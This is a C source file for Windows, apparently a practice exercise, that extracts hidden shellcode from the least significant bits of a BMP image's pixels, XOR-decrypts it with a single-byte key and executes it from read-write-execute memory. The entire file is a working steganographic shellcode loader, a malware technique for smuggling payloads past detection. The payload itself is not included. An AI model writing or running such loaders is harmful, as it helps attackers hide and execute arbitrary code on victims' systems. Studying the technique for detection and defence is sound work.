#include <windows.h>
#include <stdio.h>

#define SIZE_OF_SHELLCODE 276

PBYTE ReadFromLsb (IN LPCSTR pBmpOutputFile, SIZE_T sSizeOfShellCode){
	FILE *fin = fopen(pBmpOutputFile, "rb" );
	if(!fin){
		printf("could not get bmp file \n");
		return NULL;
	}
	
	// read bmp
	fseek(fin, 0, SEEK_END);
	SIZE_T sSizeOfBmpFile = ftell(fin);
	rewind(fin);
	printf("BMP opened size: %zu bytes\n", sSizeOfBmpFile);
	
	// create buffer
	PBYTE pBmpBuffer = (PBYTE)malloc(sSizeOfBmpFile);
	if(!pBmpBuffer){
		printf("unable to create a buffer\n");
		fclose(fin);
		return NULL;
	}
	
	// write to buffer
	fread (pBmpBuffer, 1, sSizeOfBmpFile, fin);
	fclose(fin);
	
	// at 10 = 54 so pPixel = 54 where d is store in bmp
	DWORD dwPixelOffset = *(DWORD*)(pBmpBuffer + 10);
	printf("pixel data offset is: %lu\n", dwPixelOffset);
	
	// buffer for sc 
	PBYTE pExtractedShellcode = (PBYTE)malloc(sSizeOfShellCode);
	if(!pExtractedShellcode){
		printf("Unable to extract shellcode \n");
		free(pBmpBuffer);
		free(pExtractedShellcode);
		return NULL;
	}
	
	//extract from lsb will use same func as previous just minor changes like no need to shift this time 
	SIZE_T sBitIndex = 0;
	for(SIZE_T i = 0; i < sSizeOfShellCode; i++){
		BYTE bAssembledLSB = 0;
		for(INT bit = 7; bit >= 0; bit--){
			
			// this time around we dont shift here we just want the very last bit at that 54 + index
			BYTE bExtractedBit = pBmpBuffer[dwPixelOffset + sBitIndex] &1;
			// also silly bin concept just cant loop jus do OR
			bAssembledLSB = bAssembledLSB | (bExtractedBit << bit);
		
			
			sBitIndex++;
		}
		
		pExtractedShellcode [i] = bAssembledLSB;
	}
	
	free(pBmpBuffer);
	return pExtractedShellcode;
}

VOID DecryptXor(IN PBYTE pData, IN SIZE_T sDataSize, IN PBYTE bKey, IN SIZE_T sKeySize){
	for (SIZE_T i = 0, j = 0; i < sDataSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }
        pData[i] = pData[i] ^ bKey[j];
    }
    printf("First 3 bytes are: 0x%02X 0x%02X 0x%02X\n", pData[0], pData[1], pData[2]);
}

VOID ExecuteShellCode(IN PBYTE pShellCode, IN SIZE_T sSizeOfShellCode){
	PVOID pCreateMememory = VirtualAlloc(NULL, sSizeOfShellCode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if(!pCreateMememory){
		DWORD dwError = GetLastError();
		printf("Unable to alocate memory %lu\n", dwError);
		return;
		
	}
	printf("Memory allocated at: 0x%p\n", pCreateMememory);
	memcpy(pCreateMememory, pShellCode, sSizeOfShellCode);
	printf("Shellcode copied\n");


	((void(*)())pCreateMememory)();
	Sleep(5000);
	printf("Returned from shellcode\n");
	VirtualFree(pCreateMememory, 0, MEM_RELEASE);
}

int main(){
	BYTE key[] = { 0xBD };

    printf("Extract from sten.bmp\n");
    PBYTE pExtractedShellcode = ReadFromLsb("sten.bmp", SIZE_OF_SHELLCODE);
    if (!pExtractedShellcode) {
        printf("Extraction failed");
        return 1;
    }
	
	printf("Extracted bytes: ");
    for (int i = 0; i < 12; i++) {
        printf("0x%02X ", pExtractedShellcode[i]);
    }
    printf("\n");

    DecryptXor(pExtractedShellcode, SIZE_OF_SHELLCODE, key, sizeof(key));

    ExecuteShellCode(pExtractedShellcode, SIZE_OF_SHELLCODE);

    free(pExtractedShellcode);
	
    getchar();
    return 0;
}